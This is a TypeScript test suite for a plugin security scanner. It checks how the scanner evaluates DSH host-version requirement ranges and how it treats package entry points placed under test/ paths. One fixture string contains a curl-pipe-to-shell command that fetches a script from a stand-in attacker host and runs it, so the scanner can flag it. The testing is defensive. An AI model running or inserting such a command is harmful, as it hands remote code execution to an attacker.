/**
 * 0.5.24 / static-v28：R12 的 DSH 需求闸门，以及「声明入口优先于测试路径」降级。
 *
 * 两件事都来自 DSH 0.2.2 的适配：
 * 1. `dsh-app-boot` 从 0.2.x 起在安装/激活前评估插件需求（`engines.dsh` 独自决定，否则每个
 *    `@deepseek-ai/dsh-*` peer 都要匹配）。发布工具把 peer 写成**精确版本**（实测 0.2.2-rc.1
 *    的 330 个官方包有 821 条 peer，全是 `= 0.2.2-rc.1`），所以「按上一版发布」的第三方插件
 *    在新宿主上会被直接拒绝——而 vet 以前只能等它崩。
 * 2. 路径降级必须让位给声明：`main`/`exports`/`bin` 指向 `test/` 的包，那片目录就是产品代码。
 *    旧实现只看路径，verdict 从 critical 掉到 suspicious。
 *
 * 0.5.26（static-v30，发布前自查）补的格子：部分版本 caret 锁 major（`^1.2` 不是 x-range）、
 * `engines.dsh` 存在时 DSH 不读 peer（判定顺序）、非对象 engines/peerDependencies 与确切非法
 * 范围（dist-tag/逗号/非精确 workspace:）要报、相对包根下入口集合仍要对齐。
 * 0.5.27（static-v31，再压一轮）：x-range（`0.2.x`）与 `~>` 进入求值；任一 `||` 组确证非法时
 * 整段判不满足（对照 DSH 的 unmetRequirements 移植件做过 4,000 份随机清单差分）。
 */
import { describe, expect, it } from 'vitest'
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, isAbsolute, join, relative } from 'node:path'
import { scan } from '../lib/scanner-bin/engine.js'
import { rangeAllows } from '../lib/scanner-bin/rules/dsh-requirement.js'
import { satisfiesRange } from '../lib/guard/dsh-compat.js'
import { buildFileScanRequest, hostDshVersion } from '../lib/scanner/scan-request.js'
import type { Finding, ScanRequest } from '../lib/scanner-bin/protocol.js'

/** 临时包目录 + 缓存目录（同内容换 dshVersion 时不能命中上一次的缓存）。 */
function withPkg(
  files: Record<string, string>,
  fn: (dir: string, cacheDir: string) => void,
): void {
  const dir = mkdtempSync(join(tmpdir(), 'vet-r12req-'))
  const cacheDir = mkdtempSync(join(tmpdir(), 'vet-r12req-cache-'))
  try {
    for (const [name, content] of Object.entries(files)) {
      const target = join(dir, name)
      mkdirSync(dirname(target), { recursive: true })
      writeFileSync(target, content)
    }
    fn(dir, cacheDir)
  } finally {
    rmSync(dir, { recursive: true, force: true })
    rmSync(cacheDir, { recursive: true, force: true })
  }
}

/** 包内参与扫描的文件：package.json + 夹具用到的几个入口路径。 */
function scanPkg(dir: string, cacheDir: string, dshVersion?: string): Finding[] {
  const files = [join(dir, 'package.json')]
  for (const rel of ['test/index.js', 'test/cli.js', 'index.js']) {
    const p = join(dir, rel)
    if (existsSync(p)) files.push(p)
  }
  const req: ScanRequest = {
    kind: 'files',
    files,
    cacheDir,
    ...(dshVersion !== undefined ? { dshVersion } : {}),
  }
  const res = scan(req)
  expect(res.ok, res.error).toBe(true)
  return res.report!.findings
}

function r12(findings: Finding[]): Finding[] {
  return findings.filter(f => f.rule === 'R12')
}

/** 只有 peer 声明、没有入口的第三方插件（R12 的入口检查会另给 medium，断言只看 high）。 */
const TOOLS_PEER = (range: string): string => JSON.stringify({
  name: 'third-party-demo',
  version: '1.0.0',
  peerDependencies: { '@deepseek-ai/dsh-tools': range },
})

describe('需求闸门的范围语义（与 DSH 的 includePrerelease 一致）', () => {
  it('精确版本（官方发布工具写入的形态）只接纳自己', () => {
    expect(rangeAllows('0.2.2-rc.1', '= 0.2.2-rc.1')).toBe(true)
    expect(rangeAllows('0.2.2-rc.1', '= 0.2.1-rc.5')).toBe(false)
    // 无操作符的裸版本号等同于 =（官方发行物就是这么写的：peer 值是 `0.2.2-rc.1`）
    expect(rangeAllows('0.2.2-rc.1', '0.2.1-rc.5')).toBe(false)
    expect(rangeAllows('0.2.2-rc.1', '0.2.2-rc.1')).toBe(true)
  })

  it('插入符跨补丁：0.2.2-rc.1 满足 ^0.2.1-rc.5（预发布不设闸门）', () => {
    expect(rangeAllows('0.2.2-rc.1', '^0.2.1-rc.5')).toBe(true)
    // 对照：vet 自己的「已复验范围」判定是 npm 严格语义，同一段范围**不**接纳它——
    // 两套判定服务两个问题，这条断言钉住「刻意不同」。
    expect(satisfiesRange('0.2.2-rc.1', '^0.2.1-rc.5')).toBe(false)
  })

  it('波浪号锁 minor、比较器链、通配符', () => {
    // ~0.2.0 = >=0.2.0 <0.3.0（波浪号锁 minor、放行补丁）；~0.2.2 才把它挡在外面
    expect(rangeAllows('0.2.2-rc.1', '~0.2.0')).toBe(true)
    expect(rangeAllows('0.2.2-rc.1', '~0.2.2')).toBe(false)
    expect(rangeAllows('0.2.2-rc.1', '>= 0.2.0 < 0.3.0')).toBe(true)
    expect(rangeAllows('0.2.2-rc.1', '>=0.2.3')).toBe(false)
    expect(rangeAllows('0.2.2-rc.1', '*')).toBe(true)
    expect(rangeAllows('0.2.2-rc.1', 'x')).toBe(true)
  })

  it('判不了的写法返回 undefined（不得据此报警）', () => {
    // 连字符范围合法但本模块未实现；非法 x-range 形态（1.x.3 / x.2.3）同样判不了。
    // 这两类都沉默——不把「我不知道」翻译成「你会被拒绝」。
    for (const range of ['1.2.3 - 2.0.0', '1.x.3', 'x.2.3', '']) {
      expect(rangeAllows('0.2.2-rc.1', range), range).toBeUndefined()
    }
    expect(rangeAllows('not-a-version', '^0.2.0')).toBeUndefined()
  })

  it('|| 组任一满足即通过', () => {
    expect(rangeAllows('0.2.2-rc.1', '= 0.2.1-rc.5 || = 0.2.2-rc.1')).toBe(true)
  })
})

describe('与 semver@7 差分对照（includePrerelease: true）', () => {
  // 期望值由 `semver.satisfies(v, r, { includePrerelease: true })` 生成（semver 7.8.5）：
  //   node -e "const s=require('semver'); ..." —— 不是手写的直觉，是可复现的第三方口径。
  const TABLE: Array<[string, Record<string, boolean | undefined>]> = [
    ['0.2.2-rc.1', { '= 0.2.2-rc.1': true, '= 0.2.1-rc.5': false, '^0.2.1-rc.2': true, '~0.2.0': true, '~0.2.2': false, '>= 0.2.0 < 0.3.0': true, '>=0.2.3': false, '*': true }],
    ['0.2.1-rc.5', { '= 0.2.2-rc.1': false, '= 0.2.1-rc.5': true, '^0.2.1-rc.2': true, '~0.2.0': true, '~0.2.2': false, '>= 0.2.0 < 0.3.0': true, '>=0.2.3': false, '*': true }],
    ['0.2.2', { '= 0.2.2-rc.1': false, '= 0.2.1-rc.5': false, '^0.2.1-rc.2': true, '~0.2.0': true, '~0.2.2': true, '>= 0.2.0 < 0.3.0': true, '>=0.2.3': false, '*': true }],
    ['0.3.0-rc.1', { '= 0.2.2-rc.1': false, '= 0.2.1-rc.5': false, '^0.2.1-rc.2': false, '~0.2.0': false, '~0.2.2': false, '>= 0.2.0 < 0.3.0': true, '>=0.2.3': true, '*': true, '^0.2': false, '^0.3': true, '^0.0': false, '^0.3.0-0': true, '0.2.x': false, '0.3.x': true, '^0.2.x': false }],
    ['1.0.0', { '= 0.2.2-rc.1': false, '= 0.2.1-rc.5': false, '^0.2.1-rc.2': false, '~0.2.0': false, '~0.2.2': false, '>= 0.2.0 < 0.3.0': false, '>=0.2.3': true, '*': true }],
    // 0.5.26 回归：部分版本 caret 锁 major（`^1.2` ≠ 裸 `1.2` 的 x-range）。0.5.25 把
    // `^1.2` 展开成 `<1.3.0-0`，于是 1.9.3 被判定「不接纳」——一条会升级 verdict 的假报警。
    ['1.9.3', { '^1.2': true, '^1': true, '1.2': false, '~1.2': false, '^0.2': false, '2.0.0': false, '^1.2.x': true, '^1.x': true, '1.x': true, '1.2.x': false, '~1.2.x': false, '>1.x': false, '~>1.2.3': false }],
    ['1.2.9', { '1.x': true, '1.2.x': true, '^1.2.x': true, '~1.2.x': true, '~>1.2.3': true, '>=1.x': true, '>1.x': false, '<=1.x': true, '<1.x': false }],
    ['1.3.0-0', { '^1.2': true, '1.2': false, '^1.2.0-0': true }],
  ]

  it('支持的写法逐格与 semver 一致', () => {
    for (const [version, row] of TABLE) {
      for (const [range, expected] of Object.entries(row)) {
        expect(rangeAllows(version, range), version + ' ∉ ' + range).toBe(expected)
      }
    }
  })

  it('部分版本（`>=0.2` / `<0.3` / `0.3`）与 semver 一致', () => {
    // 期望值同样由 semver@7 生成（includePrerelease）。真实插件写 `>=0.2.0-rc.2 <0.3`，
    // 本机安装的 @jiesou/dsh-opencode-zen-free-provider 就是；部分版本的两端都带 `-0`。
    const rows: Array<[string, Record<string, boolean>]> = [
      ['0.2.2-rc.1', { '>=0.2': true, '<0.3': true, '<=0.3': true, '>0.3': false, '=0.3': false, '0.3': false, '^0.3': false, '~0.3': false, '~1': false, '>=0.2 <0.3': true }],
      ['0.3.0-rc.1', { '>=0.2': true, '<0.3': false, '<=0.3': true, '>0.3': false, '=0.3': true, '0.3': true, '^0.3': true, '~0.3': true, '~1': false, '>=0.2 <0.3': false }],
      ['1.5.0', { '>=0.2': true, '<0.3': false, '<=0.3': false, '>0.3': true, '=0.3': false, '0.3': false, '^0.3': false, '~0.3': false, '~1': true, '>=0.2 <0.3': false }],
    ]
    for (const [version, row] of rows) {
      for (const [range, expected] of Object.entries(row)) {
        expect(rangeAllows(version, range), version + ' ∉ ' + range).toBe(expected)
      }
    }
  })

  it('部分版本 caret 锁 major：^1.2 接纳 1.9.3（0.5.25 假报警的回归）', () => {
    expect(rangeAllows('1.9.3', '^1.2')).toBe(true)
    expect(rangeAllows('2.0.0', '^1.2')).toBe(false)
    expect(rangeAllows('1.9.3', '^1')).toBe(true)
    // 同一个版本号，裸 x-range 与 caret 是两种含义：`1.2` 只覆盖 1.2.x
    expect(rangeAllows('1.9.3', '1.2')).toBe(false)
    expect(rangeAllows('1.2.9', '1.2')).toBe(true)
  })

  it('x-range 与部分版本同义：1.x ≡ 1、1.2.x ≡ 1.2（caret/tilde 各按自己的规则）', () => {
    expect(rangeAllows('0.2.2-rc.1', '0.2.x')).toBe(true)
    expect(rangeAllows('0.3.0-rc.1', '0.2.x')).toBe(false)
    expect(rangeAllows('1.2.9', '1.2.x')).toBe(true)
    expect(rangeAllows('1.3.0', '1.2.x')).toBe(false)
    // caret 锁 major、tilde 锁 minor——x-range 只是部分版本的另一种写法
    expect(rangeAllows('1.9.3', '^1.2.x')).toBe(true)
    expect(rangeAllows('1.9.3', '~1.2.x')).toBe(false)
    expect(rangeAllows('1.9.3', '^1.x')).toBe(true)
    // 比较器同样按 x-range 的精度取边界
    expect(rangeAllows('1.2.9', '>1.x')).toBe(false)
    expect(rangeAllows('2.0.0', '>1.x')).toBe(true)
  })

  it('~> 是 ~ 的别名（semver 接受，Ruby 风格；空格分隔同样可以）', () => {
    expect(rangeAllows('1.2.9', '~>1.2.3')).toBe(true)
    expect(rangeAllows('1.3.0', '~>1.2.3')).toBe(false)
    expect(rangeAllows('1.2.9', '~> 1.2.3')).toBe(true)
    expect(rangeAllows('1.3.0', '~> 1.2.3')).toBe(false)
  })

  it('任一 OR 组确证非法 → 整段不满足（DSH 解析整个 range，不会因第一组满足就放行）', () => {
    expect(rangeAllows('0.2.2-rc.1', '>=0.2 || workspace:^')).toBe(false)
    expect(rangeAllows('0.2.2-rc.1', '>=0.2 || latest')).toBe(false)
    // 合法但本模块未实现的组仍 fail-open（连字符范围）
    expect(rangeAllows('0.2.2-rc.1', '>=0.2 || 1.2.3 - 2.0.0')).toBeUndefined()
  })

  it('OR 组要先求完全部组再下结论（semver 解析的是整个 range）', () => {
    // 第一组满足、第二组超出本模块子集（连字符范围）→ 整体 undefined，不能提前报 true。
    expect(rangeAllows('0.2.2-rc.1', '>=0.2 || 1.2.3 - 2.0.0')).toBeUndefined()
    // 第二组是能求值的 x-range 时正常参与 OR（这里两组都不接纳 0.2.2 之外的 1.x）
    expect(rangeAllows('0.2.2-rc.1', '>=0.2 || 1.x')).toBe(true)
    // 空 OR 段在 semver 里合法（空组 = `*`）——不是「非法范围」，整体恒满足。
    expect(rangeAllows('0.2.2-rc.1', '1.0.0 ||')).toBe(true)
  })
})

describe('真实发行物里的范围形态（2026-11 npm 抽样）', () => {
  // 来源：npm search `keywords:dsh-plugin` 的 20 个结果里，16 个声明了 DSH 需求。这里钉住
  // 其中出现过的 10 种写法（长 OR 链、排除 rc 的上界、`*` 等）。期望值同时由 semver 7.8.6
  // 与真实的 `dsh-app-boot::evaluatePluginCompatibility` 核对过——16 个包 × 4 个宿主
  // = 64 组，0 分歧；本表是那份一次性核对的耐久副本。
  const REAL: Array<[string, string, boolean]> = [
    // `<0.2.2-0` 把 0.2.2 的所有预发布都排除在外：宿主 0.2.2-rc.1 会被拒绝
    ['0.2.2-rc.1', '>=0.2.0-rc.2 <0.2.2-0', false],
    ['0.2.2-rc.1', '>=0.2.0-rc.2 <0.2.1-0 || >=0.2.1-rc.1 <0.3.0-0', true],
    ['0.2.2-rc.1', '0.1.7-rc.1 || 0.1.7-rc.2 || 0.2.0-rc.1 || 0.2.0-rc.2 || 0.2.1-rc.2 || 0.2.1-rc.3 || 0.2.1-rc.4 || 0.2.1-rc.5', false],
    ['0.2.1-rc.5', '0.1.7-rc.1 || 0.1.7-rc.2 || 0.2.0-rc.1 || 0.2.0-rc.2 || 0.2.1-rc.2 || 0.2.1-rc.3 || 0.2.1-rc.4 || 0.2.1-rc.5', true],
    ['0.2.2-rc.1', '>=0.0.1-rc.1 <0.1.0 || >=0.1.0-rc.1 <0.3.0-0', true],
    ['0.2.2-rc.1', '^0.2.0-rc.1', true],
    ['0.2.2-rc.1', '*', true],
    ['0.2.2-rc.1', '>=0.2.1-rc.5', true],
    ['0.2.2-rc.1', '>=0.2.0-rc.1 <0.3.0-0 || >=0.2.1-0 <0.3.0-0 || >=0.2.2-0 <0.3.0-0', true],
    ['0.2.2-rc.1', '^0.1.0-rc.6 || ^0.1.1-rc.1 || 0.1.2-alpha.3 || 0.1.2-alpha.4 || 0.1.2-alpha.5 || 0.1.2-rc.1 || 0.1.3-alpha.2 || 0.1.5-alpha.1 || 0.1.5-alpha.2 || 0.1.5-rc.1 || 0.1.7-rc.1 || 0.1.7-rc.2 || 0.2.0-rc.1 || 0.2.0-rc.2 || 0.2.1-rc.2 || 0.2.1-rc.3 || 0.2.1-rc.4 || 0.2.1-rc.5', false],
  ]

  it('逐格与 semver / 真实 DSH 判定一致', () => {
    for (const [version, range, expected] of REAL) {
      expect(rangeAllows(version, range), version + ' ∉ ' + range).toBe(expected)
    }
  })
})

describe('R12 需求闸门（引擎端到端）', () => {
  it('peer 精确钉在上一版 → high（本机 DSH 会拒绝安装/激活）', () => {
    withPkg({ 'package.json': TOOLS_PEER('= 0.2.1-rc.5') }, (dir, cacheDir) => {
      const findings = r12(scanPkg(dir, cacheDir, '0.2.2-rc.1'))
      const hit = findings.find(f => f.severity === 'high')
      expect(hit).toBeDefined()
      expect(hit!.message).toContain('需求闸门')
      expect(hit!.message).toContain('0.2.2-rc.1')
      expect(hit!.message).toContain('@deepseek-ai/dsh-tools@= 0.2.1-rc.5')
    })
  })

  it('同一份包在它声明的那个 DSH 上 → 无 high', () => {
    withPkg({ 'package.json': TOOLS_PEER('= 0.2.1-rc.5') }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir, '0.2.1-rc.5')).filter(f => f.severity === 'high')).toEqual([])
    })
  })

  it('宿主没给 dshVersion → 不做版本对照（fail-open），但形态问题照报', () => {
    withPkg({ 'package.json': TOOLS_PEER('= 0.2.1-rc.5') }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir)).filter(f => f.severity === 'high')).toEqual([])
    })
    withPkg({
      'package.json': JSON.stringify({ name: 'x', version: '1.0.0', engines: { dsh: 42 } }),
    }, (dir, cacheDir) => {
      const findings = r12(scanPkg(dir, cacheDir))
      expect(findings.some(f => f.severity === 'high' && f.message.includes('形态非法'))).toBe(true)
    })
  })

  it('engines.dsh 独自决定：只写 engines.dsh 的包同样过闸门', () => {
    const pkg = (range: unknown): string => JSON.stringify({
      name: 'engine-only-demo',
      version: '1.0.0',
      engines: { dsh: range },
    })
    withPkg({ 'package.json': pkg('0.2.2-rc.1') }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).filter(f => f.severity === 'high')).toEqual([])
    })
    withPkg({ 'package.json': pkg('0.2.1-rc.5') }, (dir, cacheDir) => {
      const hit = r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).find(f => f.severity === 'high')
      expect(hit).toBeDefined()
      expect(hit!.message).toContain('engines.dsh=0.2.1-rc.5')
    })
  })

  it('engines.dsh 的三种必被拒形态：非字符串 / 空串 / workspace:', () => {
    for (const range of [123, '', 'workspace:^']) {
      withPkg({
        'package.json': JSON.stringify({ name: 'bad-demo', version: '1.0.0', engines: { dsh: range } }),
      }, (dir, cacheDir) => {
        const findings = r12(scanPkg(dir, cacheDir, '0.2.2-rc.1'))
        expect(findings.some(f => f.severity === 'high'), JSON.stringify(range)).toBe(true)
      })
    }
  })

  it('peer 值非字符串 → high（DSH 的 evaluatePluginCompatibility 会抛错）', () => {
    withPkg({
      'package.json': JSON.stringify({
        name: 'bad-peer', version: '1.0.0', peerDependencies: { '@deepseek-ai/dsh-tools': 42 },
      }),
    }, (dir, cacheDir) => {
      const hit = r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).find(f => f.severity === 'high')
      expect(hit).toBeDefined()
      expect(hit!.message).toContain('形态非法')
    })
  })

  it('workspace: peer 被 DSH 替换为当前运行时 → 恒满足，不报', () => {
    for (const range of ['workspace:^', 'workspace:~', 'workspace:*']) {
      withPkg({ 'package.json': TOOLS_PEER(range) }, (dir, cacheDir) => {
        expect(r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).filter(f => f.severity === 'high'), range).toEqual([])
      })
    }
  })

  it('engines / peerDependencies 非对象 → high（DSH 的 objectOf$1 直接抛错）', () => {
    withPkg({
      'package.json': JSON.stringify({
        name: 'bad-engines-shape', version: '1.0.0',
        engines: '>=0.2',
        dependencies: { '@deepseek-ai/dsh-tools': '0.2.2-rc.1' },
      }),
    }, (dir, cacheDir) => {
      expect(
        r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).some(f => f.severity === 'high' && f.message.includes('engines 形态非法')),
      ).toBe(true)
    })
    withPkg({
      'package.json': JSON.stringify({
        name: 'bad-peers-shape', version: '1.0.0',
        peerDependencies: ['@deepseek-ai/dsh-tools'],
        dependencies: { '@deepseek-ai/dsh-tools': '0.2.2-rc.1' },
      }),
    }, (dir, cacheDir) => {
      expect(
        r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).some(f => f.severity === 'high' && f.message.includes('peerDependencies 形态非法')),
      ).toBe(true)
    })
  })

  it('能确证非法的范围（dist-tag / 逗号 / 空串 / 非精确 workspace:）→ high', () => {
    for (const range of ['latest', '>=0.2.0, <0.3.0', '', 'workspace:^0.2.1', ' workspace:^ ']) {
      withPkg({ 'package.json': TOOLS_PEER(range) }, (dir, cacheDir) => {
        expect(
          r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).some(f => f.severity === 'high'),
          JSON.stringify(range),
        ).toBe(true)
      })
    }
    withPkg({
      'package.json': JSON.stringify({ name: 'tag-engine', version: '1.0.0', engines: { dsh: 'latest' } }),
    }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).some(f => f.severity === 'high')).toBe(true)
    })
    // 空 OR 段是合法的（空组 = `*`）——不能被当成非法范围
    withPkg({ 'package.json': TOOLS_PEER('1.0.0 ||') }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).filter(f => f.severity === 'high')).toEqual([])
    })
  })

  it('任何 peer 值非字符串都会让 DSH 抛错（不限于 dsh peer）', () => {
    withPkg({
      'package.json': JSON.stringify({
        name: 'bad-any-peer', version: '1.0.0',
        peerDependencies: { react: true, '@deepseek-ai/dsh-tools': '0.2.2-rc.1' },
      }),
    }, (dir, cacheDir) => {
      expect(
        r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).some(f => f.severity === 'high' && f.message.includes('"react"')),
      ).toBe(true)
    })
  })

  it('engines.dsh 存在时 DSH 不读 peerDependencies——非字符串 peer 不再假报警', () => {
    const pkg = JSON.stringify({
      name: 'engines-decides', version: '1.0.0',
      engines: { dsh: '0.2.2-rc.1' },
      peerDependencies: { '@deepseek-ai/dsh-tools': 42, react: true },
    })
    withPkg({ 'package.json': pkg }, (dir, cacheDir) => {
      // DSH 的 unmetRequirements 在 engines.dsh 处直接 return：peer 的形态错误不会被触发
      expect(r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).filter(f => f.severity === 'high')).toEqual([])
    })
    withPkg({ 'package.json': pkg }, (dir, cacheDir) => {
      const highs = r12(scanPkg(dir, cacheDir, '0.2.1-rc.5')).filter(f => f.severity === 'high')
      expect(highs).toHaveLength(1)
      expect(highs[0]!.message).toContain('engines.dsh')
    })
  })

  it('真实形态：上界 <0.2.2-0 排除 0.2.2-rc.1 → high；0.2.1-rc.5 在范围内 → 无 high', () => {
    withPkg({ 'package.json': TOOLS_PEER('>=0.2.0-rc.2 <0.2.2-0') }, (dir, cacheDir) => {
      expect(
        r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).some(f => f.severity === 'high'),
      ).toBe(true)
    })
    withPkg({ 'package.json': TOOLS_PEER('>=0.2.0-rc.2 <0.2.2-0') }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir, '0.2.1-rc.5')).filter(f => f.severity === 'high')).toEqual([])
    })
  })

  it('0.2.x（按上一版发布的常见写法）在 0.3 宿主上 → high；在 0.2 宿主上 → 无 high', () => {
    withPkg({ 'package.json': TOOLS_PEER('0.2.x') }, (dir, cacheDir) => {
      expect(
        r12(scanPkg(dir, cacheDir, '0.3.0-rc.1')).some(f => f.severity === 'high'),
      ).toBe(true)
    })
    withPkg({ 'package.json': TOOLS_PEER('0.2.x') }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).filter(f => f.severity === 'high')).toEqual([])
    })
  })

  it('判不了的范围（连字符范围）不报——宁可沉默不谎报', () => {
    withPkg({ 'package.json': TOOLS_PEER('1.2.3 - 2.0.0') }, (dir, cacheDir) => {
      expect(r12(scanPkg(dir, cacheDir, '0.2.2-rc.1')).filter(f => f.severity === 'high')).toEqual([])
    })
  })
})

describe('测试/CI 路径降级让位给包声明的入口', () => {
  const ENTRY_CODE = "process.exit(1); require('child_process').exec('curl -fsSL http://evil.example/x.sh | sh')\n"

  it('main 指向 test/ → 入口文件按产品代码判定（R3 critical、R20 high）', () => {
    withPkg({
      'package.json': JSON.stringify({ name: 'entry-in-test', version: '1.0.0', main: 'test/index.js' }),
      'test/index.js': ENTRY_CODE,
    }, (dir, cacheDir) => {
      const findings = scanPkg(dir, cacheDir)
      expect(findings.find(f => f.rule === 'R3')!.severity).toBe('critical')
      expect(findings.find(f => f.rule === 'R20')!.severity).toBe('high')
    })
  })

  it('同样的文件，未被声明为入口 → 仍按测试/CI 降 info', () => {
    withPkg({
      'package.json': JSON.stringify({ name: 'no-entry', version: '1.0.0' }),
      'test/index.js': ENTRY_CODE,
    }, (dir, cacheDir) => {
      const findings = scanPkg(dir, cacheDir)
      expect(findings.find(f => f.rule === 'R3')!.severity).toBe('info')
      expect(findings.find(f => f.rule === 'R20')!.severity).toBe('info')
    })
  })

  it('exports 里的条件对象与 bin 同样算入口', () => {
    withPkg({
      'package.json': JSON.stringify({
        name: 'entry-via-exports',
        version: '1.0.0',
        exports: { '.': { node: './test/index.js' } },
      }),
      'test/index.js': ENTRY_CODE,
    }, (dir, cacheDir) => {
      expect(scanPkg(dir, cacheDir).find(f => f.rule === 'R3')!.severity).toBe('critical')
    })
    withPkg({
      'package.json': JSON.stringify({
        name: 'entry-via-bin',
        version: '1.0.0',
        bin: { demo: './test/cli.js' },
      }),
      'test/cli.js': ENTRY_CODE,
    }, (dir, cacheDir) => {
      // R3 对 bin 入口本来就有「CLI 是产品功能」降级 → 这条用 R20 验入口识别
      expect(scanPkg(dir, cacheDir).find(f => f.rule === 'R20')!.severity).toBe('high')
    })
  })

  it('相对包根（vet-gate --package ./x）：入口集合仍对齐，判定不因路径写法改变', () => {
    withPkg({
      'package.json': JSON.stringify({ name: 'rel-entry', version: '1.0.0', main: 'test/index.js' }),
      'test/index.js': ENTRY_CODE,
    }, (dir) => {
      const req = buildFileScanRequest(relative(process.cwd(), dir), { targetKind: 'plugin' })
      expect(req.files!.length).toBeGreaterThan(0)
      // 归一化后所有文件都是绝对路径——engine 的入口集合是绝对路径，两边必须同一坐标系
      expect(req.files!.every(f => isAbsolute(f))).toBe(true)
      const res = scan(req)
      expect(res.ok, res.error).toBe(true)
      expect(res.report!.findings.find(f => f.rule === 'R20')!.severity).toBe('high')
    })
  })
})

describe('宿主接线：dshVersion 真的进了请求与缓存键', () => {
  it('buildFileScanRequest 把策略里的版本写进请求；空串省略（与探测不到等价）', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vet-r12req-req-'))
    try {
      writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'req-demo', version: '1.0.0' }))
      expect(buildFileScanRequest(dir, { dshVersion: '0.2.2-rc.1' }).dshVersion).toBe('0.2.2-rc.1')
      expect(buildFileScanRequest(dir, { dshVersion: '' }).dshVersion).toBeUndefined()
      // 缺省走进程内探测（测试环境通常探不到 → undefined；探到就必须原样进请求）
      const detected = hostDshVersion()
      expect(buildFileScanRequest(dir).dshVersion).toBe(detected === '' ? undefined : detected)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('同一个缓存目录、只换 DSH 版本 → 结论跟着换（缓存键必须含 dshVersion）', () => {
    const dir = mkdtempSync(join(tmpdir(), 'vet-r12req-shared-'))
    const cacheDir = mkdtempSync(join(tmpdir(), 'vet-r12req-shared-cache-'))
    try {
      writeFileSync(join(dir, 'package.json'), TOOLS_PEER('= 0.2.1-rc.5'))
      const files = [join(dir, 'package.json')]
      const scanWith = (dshVersion: string): Finding[] => {
        const res = scan({ kind: 'files', files, cacheDir, dshVersion })
        expect(res.ok, res.error).toBe(true)
        return res.report!.findings
      }
      // 第一遍：新宿主 → high（并写缓存）
      expect(scanWith('0.2.2-rc.1').filter(f => f.rule === 'R12' && f.severity === 'high')).toHaveLength(1)
      // 第二遍：同一个包、同一个缓存目录，换成它声明的宿主 → 必须不命中上一版的结论
      expect(scanWith('0.2.1-rc.5').filter(f => f.rule === 'R12' && f.severity === 'high')).toHaveLength(0)
      // 再换回来：仍能拿到 high（不是把缓存写坏了）
      expect(scanWith('0.2.2-rc.1').filter(f => f.rule === 'R12' && f.severity === 'high')).toHaveLength(1)
    } finally {
      rmSync(dir, { recursive: true, force: true })
      rmSync(cacheDir, { recursive: true, force: true })
    }
  })
})
